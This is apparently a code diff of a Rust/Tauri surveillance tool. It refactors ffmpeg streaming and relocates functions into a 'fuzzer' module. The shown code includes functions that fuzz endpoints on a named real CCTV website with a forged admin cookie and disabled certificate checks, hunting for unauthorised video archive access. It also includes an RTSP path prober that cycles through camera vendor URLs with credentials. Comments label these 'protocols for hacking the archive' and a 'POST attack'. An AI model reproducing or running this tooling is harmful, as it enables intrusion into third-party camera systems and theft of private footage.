@@ -21,6 +21,8 @@ use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
 use std::sync::{Arc, OnceLock};
 mod archive;
 mod archive_ai;
+mod ffmpeg;
+mod fuzzer;
 mod nexus;
 pub mod spider;
 mod streaming;
@@ -405,7 +407,7 @@ fn guess_service(port: u16) -> &'static str {
     }
 }
 
-fn normalize_host_for_scan(input: &str) -> String {
+pub fn normalize_host_for_scan(input: &str) -> String {
     input
         .trim()
         .trim_start_matches("http://")
@@ -429,7 +431,7 @@ pub fn get_vault_path() -> PathBuf {
     path
 }
 
-fn get_ffmpeg_path() -> PathBuf {
+pub fn get_ffmpeg_path() -> PathBuf {
     let bundled = get_vault_path().join(if cfg!(target_os = "windows") {
         "ffmpeg.exe"
     } else {
@@ -647,47 +649,13 @@ pub async fn start_hub_stream(
     );
 
     let mut child = tokio::process::Command::new("ffmpeg")
-        .args([
-            "-headers",
-            &format!(
+        .args({
+            let headers = format!(
                 "Cookie: {}\r\nReferer: https://videodvor.by/stream/admin.php\r\n",
                 cookie
-            ),
-            "-rtsp_transport",
-            "tcp",
-            "-fflags",
-            "+genpts+discardcorrupt",
-            "-err_detect",
-            "ignore_err",
-            "-analyzeduration",
-            "10000000",
-            "-probesize",
-            "10000000",
-            "-i",
-            &url,
-            "-c:v",
-            "libx264",
-            "-preset",
-            "ultrafast",
-            "-tune",
-            "zerolatency",
-            "-pix_fmt",   // <-- ПРИНУДИТЕЛЬНЫЙ ФОРМАТ ПИКСЕЛЕЙ
-            "yuv420p",    // <-- СТАНДАРТ ДЛЯ WEB
-            "-profile:v", // <-- ПРОФИЛЬ КОДЕКА
-            "main",       // <-- ПОДДЕРЖИВАЕТСЯ ВСЕМИ ПЛЕЕРАМИ
-            "-g",
-            "25",
-            "-keyint_min",
-            "25",
-            "-sc_threshold",
-            "0",
-            "-max_muxing_queue_size",
-            "1024",
-            "-an",
-            "-f",
-            "flv",
-            "pipe:1",
-        ])
+            );
+            crate::ffmpeg::FfmpegProfiles::web_stream(&url, Some(&headers))
+        })
         .stdout(Stdio::piped())
         .stderr(Stdio::null())
         .spawn()
@@ -824,95 +792,6 @@ fn delete_target(target_id: String) -> Result<String, String> {
     db.remove(target_id.as_bytes())
         .map_err(|e: sled::Error| e.to_string())?;
     Ok("Deleted".into())
-}
-
-async fn probe_rtsp_path(host: String, login: String, pass: String) -> Result<String, String> {
-    let channel = 1u32;
-    let rtsp_host = host
-        .trim()
-        .trim_start_matches("http://")
-        .trim_start_matches("https://")
-        .trim_start_matches("rtsp://")
-        .split('/')
-        .next()
-        .unwrap_or_default()
-        .to_string();
-
-    let urls = vec![
-        // Стандартные (Hikvision, Dahua, Generic)
-        format!(
-            "rtsp://{}:{}@{}:554/Streaming/Channels/{}01",
-            login, pass, rtsp_host, channel
-        ),
-        format!(
-            "rtsp://{}:{}@{}:554/cam/realmonitor?channel={}&subtype=0",
-            login, pass, rtsp_host, channel
-        ),
-        format!(
-            "rtsp://{}:{}@{}:554/live/ch{}",
-            login, pass, rtsp_host, channel
-        ),
-        // Xiongmai / Tantons (без user:pass@, авторизация в query)
-        format!(
-            "rtsp://{}:554/user={}&password={}&channel={}&stream=0.sdp",
-            rtsp_host, login, pass, channel
-        ),
-        format!(
-            "rtsp://{}:554/?user={}&password={}&channel={}&stream=0.sdp",
-            rtsp_host, login, pass, channel
-        ),
-        // Xiongmai / OEM
-        format!(
-            "rtsp://{}:{}@{}:554/live/ch{:02}_0",
-            login, pass, rtsp_host, channel
-        ),
-        format!(
-            "rtsp://{}:{}@{}:554/h264/ch{}/main/av_stream",
-            login, pass, rtsp_host, channel
-        ),
-        format!(
-            "rtsp://{}:{}@{}:554/?mode=real&type=live&channel={}&stream=0",
-            login, pass, rtsp_host, channel
-        ),
-        format!(
-            "rtsp://{}:{}@{}:554/{}",
-            login,
-            pass,
-            rtsp_host,
-            channel * 10 + 1
-        ),
-    ];
-
-    let ffmpeg = get_ffmpeg_path();
-    for url in urls {
-        let s = Command::new(&ffmpeg)
-            .args([
-                "-nostdin",
-                "-loglevel",
-                "error",
-                "-rtsp_transport",
-                "tcp",
-                "-i",
-                &url,
-                "-t",
-                "0.1",
-                "-f",
-                "null",
-                "-",
-            ])
-            .status();
-        if let Ok(status) = s {
-            if status.success() {
-                return Ok(url);
-            }
-        }
-    }
-
-    // Не роняем запуск стрима: возвращаем дефолтный URL для прямой попытки FFmpeg.
-    Ok(format!(
-        "rtsp://{}:{}@{}:554/Streaming/Channels/{}01",
-        login, pass, rtsp_host, channel
-    ))
 }
 
 #[tauri::command]
@@ -1087,42 +966,7 @@ pub async fn start_stream(
     }
 
     let mut child = tokio::process::Command::new("ffmpeg")
-        .args([
-            "-rtsp_transport",
-            "tcp",
-            "-fflags",
-            "+genpts+discardcorrupt",
-            "-err_detect",
-            "ignore_err",
-            "-analyzeduration",
-            "10000000",
-            "-probesize",
-            "10000000",
-            "-i",
-            &rtsp_url,
-            "-c:v",
-            "libx264",
-            "-preset",
-            "ultrafast",
-            "-tune",
-            "zerolatency",
-            "-pix_fmt",   // <-- ПРИНУДИТЕЛЬНЫЙ ФОРМАТ ПИКСЕЛЕЙ
-            "yuv420p",    // <-- СТАНДАРТ ДЛЯ WEB
-            "-profile:v", // <-- ПРОФИЛЬ КОДЕКА
-            "main",       // <-- ПОДДЕРЖИВАЕТСЯ ВСЕМИ ПЛЕЕРАМИ
-            "-g",
-            "25",
-            "-keyint_min",
-            "25",
-            "-sc_threshold",
-            "0",
-            "-max_muxing_queue_size",
-            "1024",
-            "-an",
-            "-f",
-            "flv",
-            "pipe:1",
-        ])
+        .args(crate::ffmpeg::FfmpegProfiles::web_stream(&rtsp_url, None))
         .stdout(Stdio::piped())
         .stderr(Stdio::null())
         .spawn()
@@ -3509,6 +3353,161 @@ async fn search_xm_recordings(
     }
 
     Ok(out)
+}
+
+#[tauri::command]
+async fn download_xm_archive(
+    playback_uri: String,
+    filename_hint: Option<String>,
+    task_id: Option<String>,
+    log_state: State<'_, LogState>,
+    cancel_state: State<'_, DownloadCancelState>,
+    ffmpeg_limiter: State<'_, FfmpegLimiterState>,
+) -> Result<DownloadReport, String> {
+    if playback_uri.trim().is_empty() {
+        return Err("Пустой playback_uri для XM".into());
+    }
+
+    let task_key =
+        task_id.unwrap_or_else(|| format!("xm_export_{}", Utc::now().timestamp_millis()));
+    if let Ok(mut cancelled) = cancel_state.cancelled_tasks.lock() {
+        cancelled.remove(&task_key);
+    }
+
+    push_runtime_log(
+        &log_state,
+        format!("XM_ARCHIVE_EXPORT|{}|status=started", task_key),
+    );
+
+    // Занимаем слот FFmpeg (чтобы не заспамить систему, если качаем 10 файлов сразу)
+    let permit = ffmpeg_limiter
+        .semaphore
+        .clone()
+        .acquire_owned()
+        .await
+        .map_err(|e| format!("Не удалось занять слот FFmpeg: {}", e))?;
+
+    let mut filename = filename_hint
+        .map(|s| sanitize_filename_component(&s))
+        .filter(|s| !s.is_empty())
+        .unwrap_or_else(|| format!("tantos_record_{}.mp4", Utc::now().format("%Y%m%d_%H%M%S")));
+    if !filename.contains('.') {
+        filename.push_str(".mp4");
+    }
+
+    let path = get_vault_path()
+        .join("archives")
+        .join("tantos")
+        .join(&filename);
+    let _ = std::fs::create_dir_all(path.parent().unwrap());
+    let output_path = path.to_string_lossy().to_string();
+
+    let started = std::time::Instant::now();
+
+    // Запускаем дамп RTSP-потока.
+    // ВАЖНО: Никакого ограничения по времени (-t), качаем пока камера не отдаст EOF
+    let mut child = tokio::process::Command::new("ffmpeg")
+        .args([
+            "-y",
+            "-rtsp_transport",
+            "tcp",
+            "-timeout",
+            "10000000", // Защита от зависаний (10 сек)
+            "-i",
+            &playback_uri,
+            "-c",
+            "copy", // Сквозной проброс без перекодирования (0% CPU)
+            &output_path,
+        ])
+        .stdout(std::process::Stdio::null())
+        .stderr(std::process::Stdio::null())
+        .spawn()
+        .map_err(|e| format!("Не удалось запустить FFmpeg для дампа: {}", e))?;
+
+    let mut last_size: u64 = 0;
+    let mut last_progress = std::time::Instant::now();
+
+    loop {
+        // 1. Проверка на отмену пользователем
+        if cancel_state
+            .cancelled_tasks
+            .lock()
+            .map(|s| s.contains(&task_key))
+            .unwrap_or(false)
+        {
+            let _ = child.start_kill();
+            let _ = std::fs::remove_file(&path);
+            drop(permit);
+            push_runtime_log(
+                &log_state,
+                format!("DOWNLOAD_CANCELLED|{}|{}", task_key, filename),
+            );
+            return Err("Загрузка отменена".into());
+        }
+
+        // 2. Проверка: завершил ли FFmpeg скачивание (камера прислала EOF)
+        match child.try_wait() {
+            Ok(Some(status)) => {
+                if !status.success() {
+                    drop(permit);
+                    return Err(format!("Сбой скачивания архива Tantos: {}", status));
+                }
+                break; // Успешно скачали!
+            }
+            Ok(None) => {} // Ещё качается
+            Err(e) => {
+                drop(permit);
+                return Err(format!("Ошибка процесса FFmpeg: {}", e));
+            }
+        }
+
+        // 3. Отправляем прогресс в UI каждые 2 секунды
+        if last_progress.elapsed() >= std::time::Duration::from_secs(2) {
+            let current_size = std::fs::metadata(&path)
+                .map(|m| m.len())
+                .unwrap_or(last_size);
+            if current_size > last_size {
+                // Выводим размер, так как точный % узнать у RTSP нельзя
+                push_runtime_log(
+                    &log_state,
+                    format!("DOWNLOAD_PROGRESS|{}|{}|0", task_key, current_size),
+                );
+                last_size = current_size;
+            }
+            last_progress = std::time::Instant::now();
+        }
+
+        // 4. Глобальный таймаут (2 часа максимум на один файл, чтобы не висел вечно)
+        if started.elapsed() > std::time::Duration::from_secs(7200) {
+            let _ = child.start_kill();
+            drop(permit);
+            return Err("Таймаут скачивания архива Tantos (2 часа)".into());
+        }
+
+        tokio::time::sleep(std::time::Duration::from_millis(500)).await;
+    }
+
+    let bytes_written = std::fs::metadata(&path).map(|m| m.len()).unwrap_or(0);
+    drop(permit);
+
+    push_runtime_log(
+        &log_state,
+        format!(
+            "XM_ARCHIVE_EXPORT|{}|status=done|bytes={}",
+            task_key, bytes_written
+        ),
+    );
+
+    Ok(DownloadReport {
+        server_alias: "tantos_rtsp".into(),
+        filename,
+        save_path: output_path,
+        bytes_written,
+        total_bytes: bytes_written,
+        duration_ms: started.elapsed().as_millis(),
+        resumed: false,
+        skipped_as_complete: false,
+    })
 }
 
 #[tauri::command]
@@ -6249,160 +6248,6 @@ async fn nemesis_analyze_web_sources(
 }
 
 #[tauri::command]
-async fn nemesis_fuzz_archive_endpoint(
-    admin_hash: String,
-    target_ftp_path: String,
-) -> Result<Vec<String>, String> {
-    let client = reqwest::Client::builder()
-        .user_agent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36")
-        .danger_accept_invalid_certs(true)
-        .build()
-        .map_err(|e| e.to_string())?;
-
-    let mut successful_hits = Vec::new();
-    let endpoints = vec![
-        "rtsp2mjpeg.php",
-        "ajax.php",
-        "test.php",
-        "check.php",
-        "get.php",
-        "video.php",
-        "archive.php",
-        "stream.php",
-        "api.php",
-    ];
-    let param_names = vec![
-        "file",
-        "path",
-        "src",
-        "video",
-        "archive_path",
-        "url",
-        "id",
-        "name",
-        "target",
-    ];
-
-    for endpoint in endpoints {
-        for param in &param_names {
-            let url = format!(
-                "https://videodvor.by/stream/{}?{}={}&get=1",
-                endpoint, param, target_ftp_path
-            );
-            if let Ok(resp) = client
-                .get(&url)
-                .header("Cookie", format!("login=mvd; admin={}", admin_hash))
-                .send()
-                .await
-            {
-                let status = resp.status();
-                let len = resp.content_length().unwrap_or(0);
-                let ctype = resp
-                    .headers()
-                    .get("content-type")
-                    .and_then(|v| v.to_str().ok())
-                    .unwrap_or("");
-
-                if status.is_success()
-                    && (ctype.contains("video") || ctype.contains("octet-stream") || len > 500_000)
-                {
-                    successful_hits.push(format!("🎯 УСПЕХ (ВИДЕО): {}", url));
-                } else if status.is_success() && len > 0 {
-                    let body = resp.text().await.unwrap_or_default();
-                    if body.contains(".mkv") && !body.contains("<!DOCTYPE html>") {
-                        successful_hits.push(format!("💡 НАЙДЕН РЫЧАГ (ССЫЛКА): {}", url));
-                    }
-                }
-            }
-        }
-    }
-    if successful_hits.is_empty() {
-        Ok(vec![
-            "GET-сканирование завершено. Прямых точек входа не найдено.".to_string(),
-        ])
-    } else {
-        Ok(successful_hits)
-    }
-}
-
-#[tauri::command]
-async fn nemesis_fuzz_post_endpoints(
-    admin_hash: String,
-    target_ftp_path: String,
-) -> Result<Vec<String>, String> {
-    let client = reqwest::Client::builder()
-        .user_agent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36")
-        .danger_accept_invalid_certs(true)
-        .build()
-        .map_err(|e| e.to_string())?;
-
-    let mut successful_hits = Vec::new();
-    let endpoints = vec![
-        "ajax.php",
-        "check.php",
-        "get.php",
-        "rtsp2mjpeg.php",
-        "api.php",
-        "video.php",
-    ];
-    let param_names = vec!["path", "file", "url", "target", "src"];
-    let actions = vec!["download", "get_video", "fetch", "load", "archive"];
-
-    for endpoint in endpoints {
-        for param in &param_names {
-            for action in &actions {
-                let url = format!("https://videodvor.by/stream/{}", endpoint);
-                let payload = [
-                    (param.to_string(), target_ftp_path.clone()),
-                    ("action".to_string(), action.to_string()),
-                ];
-
-                if let Ok(resp) = client
-                    .post(&url)
-                    .header("Cookie", format!("login=mvd; admin={}", admin_hash))
-                    .header("X-Requested-With", "XMLHttpRequest") // Маскируемся под AJAX
-                    .form(&payload)
-                    .send()
-                    .await
-                {
-                    let status = resp.status();
-                    let content_length = resp.content_length().unwrap_or(0);
-                    let content_type = resp
-                        .headers()
-                        .get("content-type")
-                        .and_then(|v| v.to_str().ok())
-                        .unwrap_or("");
-
-                    if status.is_success()
-                        && (content_type.contains("video") || content_length > 500_000)
-                    {
-                        successful_hits.push(format!(
-                            "🎯 POST-УСПЕХ (ВИДЕО) в {} [{}={}&action={}]",
-                            url, param, target_ftp_path, action
-                        ));
-                    } else if status.is_success() && content_length > 0 {
-                        let body = resp.text().await.unwrap_or_default();
-                        if body.contains(".mkv") && !body.contains("<!DOCTYPE html>") {
-                            successful_hits.push(format!(
-                                "💡 POST-РЫЧАГ (ССЫЛКА) в {}: {}",
-                                url,
-                                &body.chars().take(150).collect::<String>()
-                            ));
-                        }
-                    }
-                }
-            }
-        }
-    }
-
-    if successful_hits.is_empty() {
-        Ok(vec!["POST-атака завершена. Пусто.".to_string()])
-    } else {
-        Ok(successful_hits)
-    }
-}
-
-#[tauri::command]
 async fn analyze_security_headers(
     target_url: String,
     log_state: State<'_, LogState>,
@@ -6609,7 +6454,7 @@ fn main() {
             streaming::restart_stream,
             geocode_address,
             generate_nvr_channels,
-            streaming::probe_rtsp_path,
+            fuzzer::probe_rtsp_path,
             search_global_hub,
             get_ftp_folders,
             download_ftp_file,
@@ -6628,6 +6473,7 @@ fn main() {
             extract_isapi_search_template_from_har,
             search_isapi_recordings,
             search_xm_recordings,
+            download_xm_archive,
             search_onvif_recordings,
             download_onvif_recording_token,
             archive::download_isapi_playback_uri,
@@ -6641,8 +6487,8 @@ fn main() {
             // 🔥 ПРОТОКОЛЫ NEMESIS ДЛЯ ВЗЛОМА АРХИВА
             // ---------------------------------------------
             nemesis_auto_login,
-            nemesis_fuzz_archive_endpoint,
-            nemesis_fuzz_post_endpoints,
+            fuzzer::nemesis_fuzz_archive_endpoint,
+            fuzzer::nemesis_fuzz_post_endpoints,
             // ---------------------------------------------
             // 🛡️ НОВЫЙ МОДУЛЬ ГЛУБОКОГО АУДИТА (ЦМУС)
             // ---------------------------------------------
@@ -6654,6 +6500,7 @@ fn main() {
             download_http_archive,
             recon_hub_archive_routes,
             spider::spider_full_scan,
+            spider::fuzz_cctv_api,
             relay_ping,
             relay_list_files,
             relay_download_file
